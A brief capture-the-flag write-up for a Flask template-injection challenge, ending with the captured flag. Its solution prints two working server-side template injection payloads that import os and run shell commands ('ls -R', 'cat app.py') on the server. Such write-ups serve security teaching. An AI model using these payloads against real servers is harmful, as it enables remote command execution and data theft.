# Games or No Games But Unlimited Games

**Challenge Type: Template Injection**  

## Challenge

I recieved a secret message from the JONKLER in Arkham Asylum. It says: t-t-tHE wAy tHEE SeRvER renDeRs tEmpLAteS oN thE wEbSiTe iS wEiRD! Actually Jonkler Moment.
<br>
games.nypinfosec.com

## Solution 

1) Enter the login/register screen, you shall see that the website take your username and directly put it in the url. 
> Indication of potential injection
2) Using what the crazy man said, we can infer it is template injection.
3) Let's use the payload ``` {{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}```
> This is to see what are the folders involved.
4) After revealing that it runs app.py, let's open it then using the payload ```{{request.application.__globals__.__builtins__.__import__('os').popen('cat app.py').read()}}  ```
5) Flag found: NYP{Fl4$K_$ST1_1nj3ct10n@1B2C3}